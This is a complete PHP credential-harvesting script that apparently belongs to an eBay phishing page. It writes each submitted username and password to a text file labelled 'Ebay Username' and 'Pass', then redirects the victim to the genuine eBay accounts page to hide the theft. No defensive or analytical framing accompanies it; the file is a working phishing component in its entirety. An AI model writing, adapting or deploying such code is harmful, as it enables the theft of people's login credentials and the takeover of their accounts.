<?php

file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>